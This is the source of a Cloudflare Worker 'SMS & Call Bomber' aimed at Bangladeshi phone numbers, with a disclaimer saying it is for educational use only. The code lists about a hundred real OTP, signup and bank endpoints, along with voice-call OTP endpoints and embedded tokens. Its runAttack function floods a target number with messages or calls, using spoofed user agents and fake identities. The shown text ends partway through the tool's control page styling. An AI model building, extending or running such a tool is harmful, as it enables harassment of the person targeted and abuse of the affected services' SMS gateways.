/**
 * BD SMS & Call Bomber Pro — Cloudflare Worker v4.0
 * ─────────────────────────────────────────────────────────────
 * Developer  : Md Salman Biswas
 * GitHub     : https://github.com/salman-dev-app
 * Email      : mdsalmanhelp@gmail.com
 * WhatsApp   : +8801840933137
 * Telegram   : @Otakuosenpai
 *
 * ⚠  FOR EDUCATIONAL / SECURITY RESEARCH PURPOSES ONLY.
 *    Unauthorized use is ILLEGAL under the Bangladesh ICT Act.
 * ─────────────────────────────────────────────────────────────
 */

// ─────────────────────────────────────────────────────────────
//  UTILITY HELPERS
// ─────────────────────────────────────────────────────────────
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
];

const randUA   = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
const randInt  = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const randMail = () => `user${randInt(10000,99999)}@gmail.com`;
const randName = () => ["Salman","Biswas","Rahim","Karim","Ahmed","Islam","Khan"][randInt(0,6)];
const baseHdr  = () => ({ "User-Agent": randUA(), "Content-Type": "application/json", "Accept": "application/json" });

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ─────────────────────────────────────────────────────────────
//  SMS API DEFINITIONS  (100 gateways)
// ─────────────────────────────────────────────────────────────
const SMS_APIS = [
  (n) => fetch("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({full_name:randName(),company_name:"Test",email_address:randMail(),phone_number:n})
  }),
  (n) => fetch("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile_no:n})
  }),
  (n) => fetch("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({data:{country_calling_code:"88",contact_no:n,headers:{PlatForm:"Web"}}})
  }),
  (n) => fetch("https://api-gateway.sundarbancourierltd.com/graphql", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({operationName:"CreateAccessToken",variables:{accessTokenFilter:{userName:n}},
      query:"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }"})
  }),
  (n) => fetch("https://api.apex4u.com/api/auth/login", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phoneNumber:n})
  }),
  (n) => fetch("https://webapi.robi.com.bd/v1/send-otp", {
    method:"POST", headers:{...baseHdr(), Authorization:"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"},
    body: JSON.stringify({phone_number:n, type:"doorstep"})
  }),
  (n) => fetch("https://web-api.banglalink.net/api/v1/user/otp-login/request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://webloginda.grameenphone.com/backend/api/v1/otp", {
    method:"POST", headers:{"User-Agent":randUA(),"Content-Type":"application/x-www-form-urlencoded"},
    body: `msisdn=${n}`
  }),
  (n) => fetch("https://webapi.robi.com.bd/v1/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone_number:n, type:"my_offer"})
  }),
  (n) => fetch("https://da-api.robi.com.bd/da-nll/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:n})
  }),
  (n) => fetch("https://webapi.robi.com.bd/v1/chat/send-otp", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({phone_number:n, name:randName(), type:"video-chat"})
  }),
  (n) => fetch("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phoneNumber:n})
  }),
  (n) => fetch("https://fundesh.com.bd/api/auth/generateOTP", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:n})
  }),
  (n) => fetch(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${n}`, {
    headers:baseHdr()
  }),
  (n) => fetch("https://api.motionview.com.bd/api/send-otp-phone-signup", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({number:"+88"+n})
  }),
  (n) => fetch("https://user-api.jslglobal.co:444/v2/send-otp", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({phone:"+88"+n, jatri_token:"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"})
  }),
  (n) => fetch(`https://chinaonlinebd.com/api/login/getOtp?phone=${n}`, {headers:baseHdr()}),
  (n) => fetch("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({number:"+88"+n})
  }),
  (n) => fetch("https://api.shikho.com/auth/v2/send/sms", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({phone:n, type:"student", auth_type:"signup"})
  }),
  (n) => fetch("https://api.redx.com.bd/v1/user/signup", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({name:randName(), phoneNumber:n, service:"redx"})
  }),
  (n) => fetch(`https://www.bioscopelive.com/en/login/send-otp?phone=88${n}&operator=bd-otp`, {
    method:"POST", headers:baseHdr()
  }),
  (n) => fetch(`https://ss.binge.buzz/otp/send/login${n}`, {
    method:"POST", headers:baseHdr()
  }),
  (n) => fetch("https://applink.com.bd/appstore-v4-server/login/otp/request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:"88"+n})
  }),
  (n) => fetch("https://chokrojan.com/api/v1/passenger/login/mobile", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile_number:n})
  }),
  (n) => fetch("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({mobileNo:n, product_id:"250", requestChannel:"MOB"})
  }),
  (n) => fetch("https://core.easy.com.bd/api/v1/registration", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({mobile:n, password:"Pass1234!", password_confirmation:"Pass1234!"})
  }),
  (n) => fetch("https://eshop-api.banglalink.net/api/v1/customer/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({type:"phone", phone:n})
  }),
  (n) => fetch("https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNo:n, product_id:"122"})
  }),
  (n) => fetch(`https://api.mygp.cinematic.mobi/api/v1/otp/88${n}/SBENT_3GB7D`, {
    method:"POST", headers:baseHdr()
  }),
  (n) => fetch("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${n}`, {
    method:"POST", headers:baseHdr()
  }),
  (n) => fetch(`http://apibeta.iqra-live.com/api/v1/sent-otp/${n}`, {headers:baseHdr()}),
  (n) => fetch("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({cli:n.replace(/^0/,"")})
  }),
  (n) => fetch("https://www.mcbaffiliate.com/Affiliate/RequestOTP", {
    method:"POST", headers:{...baseHdr(),"Content-Type":"application/x-www-form-urlencoded"},
    body:`PhoneNumber=${n}`
  }),
  (n) => fetch("https://mithaibd.com/api/login/", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n, password1:"Pass1234"})
  }),
  (n) => fetch("https://api.englishmojabd.com/api/v1/auth/login", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:"+88"+n})
  }),
  (n) => fetch("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://api.osudpotro.com/api/v1/users/send_otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:"+88-"+n})
  }),
  (n) => fetch(`https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88${n}`, {headers:baseHdr()}),
  (n) => fetch("https://auth.qcoom.com/api/v1/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNumber:"+88"+n})
  }),
  (n) => fetch("https://reseller.circle.com.bd/api/v2/auth/signup", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({email_or_phone:"+88"+n})
  }),
  (n) => fetch("https://backend-api.shomvob.co/api/v2/otp/phone", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch(`https://api.win2gain.com/api/Users/RequestOtp?msisdn=88${n}`, {headers:baseHdr()}),
  (n) => fetch("https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({walletNumber:n})
  }),
  (n) => fetch("https://rootsedulive.com/api/auth/register", {
    method:"POST", headers:{...baseHdr(),"Content-Type":"application/x-www-form-urlencoded"},
    body:`phone=88${n}`
  }),
  (n) => fetch("https://rootsedulive.com/api/auth/forget-password", {
    method:"POST", headers:{...baseHdr(),"Content-Type":"application/x-www-form-urlencoded"},
    body:`phoneOrEmail=88${n}`
  }),
  (n) => fetch(`https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88${n}/`, {
    method:"POST", headers:baseHdr()
  }),
  (n) => fetch("https://user-api.jslglobal.co:444/v1/send-otp", {
    method:"POST", headers:{...baseHdr(),"Content-Type":"application/x-www-form-urlencoded"},
    body:`phone=%2B88${n}&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj`
  }),
  (n) => fetch("https://www.shajgoj.com/api/v1/auth/register", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n, country_code:"88"})
  }),
  (n) => fetch("https://pathao.com/api/v1/clients/registration/resend-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:"+88"+n})
  }),
  (n) => fetch("https://api.shohoz.com/v3.3/web/user/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone_number:n})
  }),
  (n) => fetch("https://api.shuttle.com.bd/api/v1/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://core.ifarmer.asia/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n, country_code:"+88"})
  }),
  (n) => fetch("https://api.10minuteschool.com/auth/otp/send", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({phone_number:"0"+n.slice(-10), country_code:"+880"})
  }),
  (n) => fetch("https://api.priyoshop.com/api/v2/user/register", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n, name:randName()})
  }),
  (n) => fetch("https://daktarbhai.com/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://www.doctorola.com/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n, type:"register"})
  }),
  (n) => fetch("https://arogga.com/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://chaldal.com/api/OtpAuth/SendOtp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phoneNumber:n})
  }),
  (n) => fetch("https://api.othoba.com/api/v2/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://member.daraz.com.bd/user/api/otp/phone/generate", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n, countryCode:"BD"})
  }),
  (n) => fetch("https://www.pickaboo.com/api/v2/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n, action:"register"})
  }),
  (n) => fetch("https://www.ryanscomputers.com/api/v1/customer/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://www.startech.com.bd/api/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://techlandbd.com/api/otp/request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://www.ucash.com.bd/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:n})
  }),
  (n) => fetch("https://api.okwallet.com.bd/v1/auth/otp/generate", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://api.tap.com.bd/v1/user/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://nexuspay.com.bd/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n, type:"login"})
  }),
  (n) => fetch("https://ibranking.bracbank.com/api/v1/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNumber:n})
  }),
  (n) => fetch("https://www.dutchbanglabank.com/api/v1/mobilebanking/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://ib.thecitybank.com/api/v2/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phoneNumber:n})
  }),
  (n) => fetch("https://ebl.com.bd/api/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://www.sbl.com.bd/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNo:n})
  }),
  (n) => fetch("https://ib.abbank.com.bd/api/v1/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n, type:"registration"})
  }),
  (n) => fetch("https://aibl.com.bd/api/v1/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://ificbank.com.bd/api/v1/user/otp-send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://www.premierbank.com.bd/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://www.onebankbd.com/api/v1/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNumber:n})
  }),
  (n) => fetch("https://api.kenakata.net/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://uddoktaplus.com/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://sslwireless.com/api/v3/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:n})
  }),
  (n) => fetch("https://cloud.revesystems.com/api/v1/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n, country_code:"880"})
  }),
  (n) => fetch("https://api.sprintit.com.bd/v1/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://www.meghnabank.com.bd/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNo:n})
  }),
  (n) => fetch("https://nrbbank.com.bd/api/v1/user/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://www.globalislamibank.com.bd/api/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://mtb.com.bd/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNumber:n})
  }),
  (n) => fetch("https://www.communitybank.com.bd/api/v1/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://www.primebank.com.bd/api/v1/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://www.standardbankbd.com/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobileNo:n})
  }),
  (n) => fetch("https://www.wooribank.com.bd/api/v1/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://nrbcbank.com/api/v1/auth/otp-request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://api.cellbazaar.com/v2/auth/send-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone:n})
  }),
  (n) => fetch("https://web-api.banglalink.net/api/v1/user/number/validation/"+n, {headers:baseHdr()}),
  (n) => fetch("https://teletalk.com.bd/api/v1/auth/otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://myaccount.bd.airtel.com/bd/api/v1/auth/otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:n})
  }),
  (n) => fetch("https://api.mygp.cinematic.mobi/api/v2/auth/otp/88"+n, {
    method:"POST", headers:baseHdr()
  }),
];

// ─────────────────────────────────────────────────────────────
//  CALLING API DEFINITIONS  (8 BD gateways)
// ─────────────────────────────────────────────────────────────
const CALL_APIS = [
  (n) => fetch("https://webapi.robi.com.bd/v1/send-voice-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({phone_number:n, type:"voice_otp"})
  }),
  (n) => fetch("https://webloginda.grameenphone.com/backend/api/v1/voice-otp", {
    method:"POST", headers:{...baseHdr(),"Content-Type":"application/x-www-form-urlencoded"},
    body:`msisdn=${n}`
  }),
  (n) => fetch("https://web-api.banglalink.net/api/v1/user/voice-otp/request", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://teletalk.com.bd/api/v1/auth/voice-otp/send", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({mobile:n})
  }),
  (n) => fetch("https://myaccount.bd.airtel.com/bd/api/v1/auth/voice-otp", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({msisdn:n})
  }),
  (n) => fetch("https://api.exotel.com/v1/Accounts/bd_test/Calls/connect.json", {
    method:"POST", headers:{...baseHdr(),"Content-Type":"application/x-www-form-urlencoded"},
    body:`From=0${n}&To=%2B88${n}&CallerId=09609000000`
  }),
  (n) => fetch("https://api.banglaphone.net.bd/v1/ivr/call", {
    method:"POST", headers:baseHdr(), body: JSON.stringify({destination:n, caller_id:"01800000000"})
  }),
  (n) => fetch("https://us-central1-doctime-465c7.cloudfunctions.net/sendVoiceOTP", {
    method:"POST", headers:baseHdr(),
    body: JSON.stringify({data:{contact_no:n, country_calling_code:"88"}})
  }),
];

// ─────────────────────────────────────────────────────────────
//  CORE ATTACK FUNCTION  (runs inside the Worker)
// ─────────────────────────────────────────────────────────────
async function runAttack(number, count, mode, delayMs) {
  const apis = mode === "call" ? CALL_APIS : SMS_APIS;
  let sent = 0, success = 0;
  const logs = [];

  const promises = [];
  for (let i = 0; i < count; i++) {
    const api = apis[Math.floor(Math.random() * apis.length)];
    const p = (async () => {
      try {
        const r = await api(number);
        sent++;
        if ([200, 201, 202].includes(r.status)) {
          success++;
          logs.push({ type: "success", msg: `Gateway responded ${r.status} — ${mode.toUpperCase()} sent.` });
        } else {
          logs.push({ type: "warn", msg: `Gateway rejected — HTTP ${r.status}.` });
        }
      } catch (e) {
        logs.push({ type: "error", msg: `Connection error — ${e.message || "timeout"}.` });
      }
    })();
    promises.push(p);
    if (delayMs > 0) await sleep(delayMs);
  }

  await Promise.allSettled(promises);
  return { sent, success, failed: sent - success, logs };
}

// ─────────────────────────────────────────────────────────────
//  HTML PAGE  (served at GET /)
// ─────────────────────────────────────────────────────────────
const PAGE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>BD Bomber Pro — Cloudflare Worker | Md Salman Biswas</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
<style>
:root{--bg:#07080f;--surface:#0d0f1c;--surface2:#12152a;--border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.12);--primary:#4f8ef7;--accent:#a78bfa;--success:#34d399;--danger:#f87171;--warning:#fbbf24;--text:#e2e8f0;--muted:#64748b;}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(79,142,247,0.03)1px,transparent 1px),linear-gradient(90deg,rgba(79,142,247,0.03)1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none;}
.wb{position:relative;z-index:10;background:linear-gradient(90deg,rgba(251,191,36,.12),rgba(248,113,113,.12));border-bottom:1px solid rgba(251,191,36,.2);padding:9px 5%;font-size:.75rem;color:#fbbf24;}
.wb strong{color:#f87171;}
.nav{position:sticky;top:0;z-index:90;display:flex;align-items:center;justify-content:space-between;padding:0 5%;height:60px;background:rgba(7,8,15,.88);backdrop-filter:blur(18px);border-bottom:1px solid var(--border);}
.brand{display:flex;align-items:center;gap:9px;text-decoration:none;}
.bicon{width:32px;height:32px;background:linear-gradient(135deg,var(--primary),var(--accent));border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:.85rem;box-shadow:0 4px 14px rgba(79,142,247,.3);}
.bname{font-size:.95rem;font-weight:700;color:var(--text);}
.bname span{color:var(--primary);}
.nsoc{display:flex;gap:7px;}
.nsoc a{width:34px;height:34px;border-radius:8px;background:var(--surface2);border:1px solid var(--border);color:var(--muted);display:flex;align-items:center;justify-content:center;font-size:.82rem;text-decoration:none;transition:all .2s;}
.nsoc a:hover{border-color:var(--primary);color:var(--primary);}
.hero{position:relative;z-index:1;text-align:center;padding:60px 20px 44px;}
.eyebrow{display:inline-flex;align-items:center;gap:7px;padding:5px 13px;background:rgba(79,142,247,.1);border:1px solid rgba(79,142,247,.22);border-radius:20px;font-size:.7rem;font-weight:600;color:var(--primary);letter-spacing:1px;text-transform:uppercase;margin-bottom:20px;}
.eyebrow::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--success);box-shadow:0 0 8px var(--success);animation:pulse 2s infinite;}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.hero h1{font-size:clamp(1.8rem,4.5vw,2.8rem);font-weight:900;line-height:1.2;letter-spacing:-1px;margin-bottom:14px;}
.grad{background:linear-gradient(135deg,var(--primary),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
.hero p{font-size:.95rem;color:var(--muted);max-width:440px;margin:0 auto 28px;line-height:1.7;}
.hstats{display:inline-flex;gap:28px;padding:14px 28px;background:var(--surface);border:1px solid var(--border);border-radius:14px;}
.hs{text-align:center;}
.hs-v{font-size:1.3rem;font-weight:800;display:block;}
.hs-l{font-size:.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;}
.wrap{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:0 20px 70px;display:grid;grid-template-columns:360px 1fr;gap:20px;align-items:start;}
@media(max-width:860px){.wrap{grid-template-columns:1fr;}}
.card{background:var(--surface);border:1px solid var(--border);border-radius:18px;padding:26px;position:relative;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.4);}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:.6;}
.ct{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);margin-bottom:20px;display:flex;align-items:center;gap:7px;}
.ct i{color:var(--primary);}
.tabs{display:flex;gap:5px;background:var(--bg);border:1px solid var(--border);border-radius:11px;padding:4px;margin-bottom:18px;}
.tab{flex:1;padding:8px;border:none;border-radius:8px;background:transparent;color:var(--muted);font-size:.74rem;font-weight:600;cursor:pointer;transition:all .2s;}
.tab.active{background:var(--surface2);color:var(--text);box-shadow:0 2px 8px rgba(0,0,0,.3);}
.field{margin-bottom:16px;}
.field label{display:block;font-size:.7rem;font-weight:600;color:var(--muted);letter-spacing:.4px;text-transform:uppercase;margin-bottom:7px;}
.iw{position:relative;}
.iw i{position:absolute;left:13px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:.82rem;pointer-events:none;}
.field input{width:100%;padding:12px 12px 12px 37px;background:var(--bg);border:1px solid var(--border2);border-radius:11px;color:var(--text);font-size:.9rem;font-family:'JetBrains Mono',monospace;outline:none;transition:all .2s;}
.field input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(79,142,247,.1);}
.field input::placeholder{color:#374151;}
.rw{display:flex;gap:7px;}
.rw input{flex:1;}
.rb{min-width:44px;background:rgba(79,142,247,.1);border:1px solid rgba(79,142,247,.2);border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:.72rem;color:var(--primary);font-weight:700;padding:0 8px;}
.btn{width:100%;padding:14px;border:none;border-radius:11px;font-size:.86rem;font-weight:700;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;}
.btn-p{background:linear-gradient(135deg,var(--primary),#6366f1);color:#fff;box-shadow:0 4px 18px rgba(79,142,247,.25);}
.btn-p:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 8px 24px rgba(79,142,247,.35);}
.btn-d{background:rgba(248,113,113,.1);color:var(--danger);border:1px solid rgba(248,113,113,.22);}
.btn-d:hover{background:rgba(248,113,113,.18);}
.brow{display:flex;gap:8px;margin-top:14px;}
.brow .btn{flex:1;}
.sg{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:18px;}
.st{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:14px 12px;text-align:center;position:relative;overflow:hidden;}
.st::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;}
.st.ss::after{background:var(--primary)}.st.su::after{background:var(--success)}.st.sf::after{background:var(--danger)}.st.sr::after{background:var(--accent)}
.sv{font-size:1.8rem;font-weight:900;color:var(--text);display:block;font-family:'JetBrains Mono',monospace;line-height:1;margin-bottom:4px;}
.sl{font-size:.6rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);font-weight:600;}
.pw{margin-top:16px;}
.ph{display:flex;justify-content:space-between;font-size:.7rem;color:var(--muted);margin-bottom:5px;}
.pb{height:5px;background:var(--bg);border-radius:99px;overflow:hidden;}
.pf{height:100%;background:linear-gradient(90deg,var(--primary),var(--accent));border-radius:99px;transition:width .5s ease;width:0%;}
.rp{display:flex;flex-direction:column;gap:18px;}
.th{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
.tdots{display:flex;gap:5px;}
.dot{width:10px;height:10px;border-radius:50%;}
.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
.tc{background:none;border:none;cursor:pointer;font-size:.63rem;color:var(--muted);padding:2px 7px;border-radius:5px;transition:all .2s;}
.tc:hover{color:var(--text);background:var(--surface2);}
.tb{background:#04050a;border:1px solid rgba(255,255,255,.04);border-radius:12px;padding:14px;height:260px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:.76rem;line-height:1.6;}
.tb::-webkit-scrollbar{width:3px}.tb::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
.ll{display:flex;align-items:flex-start;gap:7px;padding:3px 0;animation:fl .3s ease;}
@keyframes fl{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:translateY(0)}}
.lt{color:#374151;flex-shrink:0;font-size:.68rem;}
.lm{color:var(--muted);}
.ll.success .lm{color:var(--success)}.ll.error .lm{color:var(--danger)}.ll.info .lm{color:var(--primary)}.ll.warn .lm{color:var(--warning)}
.dis{position:relative;z-index:1;background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.15);border-radius:14px;padding:18px 22px;margin:0 20px 28px;max-width:1100px;margin-left:auto;margin-right:auto;display:flex;gap:14px;align-items:flex-start;}
.di{width:36px;height:36px;background:rgba(248,113,113,.12);border-radius:9px;display:flex;align-items:center;justify-content:center;color:var(--danger);font-size:.95rem;flex-shrink:0;}
.dis h4{font-size:.78rem;font-weight:700;color:var(--danger);margin-bottom:4px;}
.dis p{font-size:.73rem;color:var(--muted);line-height:1.6;}
.dis strong{color:var(--text);}
.ac{display:flex;gap:16px;align-items:center;flex-wrap:wrap;}
.av{width:50px;height:50px;border-radius:12px;background:linear-gradient(135deg,var(--primary),var(--accent));display:flex;align-items:center;justify-content:center;font-size:1.2rem;color:#fff;font-weight:900;flex-shrink:0;box-shadow:0 4px 14px rgba(79,142,247,.28);}
.ai{flex:1;min-width:0;}
.an{font-size:.95rem;font-weight:700;color:var(--text);margin-bottom:3px;}
.ar{font-size:.7rem;color:var(--muted);margin-bottom:8px;}
.als{display:flex;flex-wrap:wrap;gap:5px;}
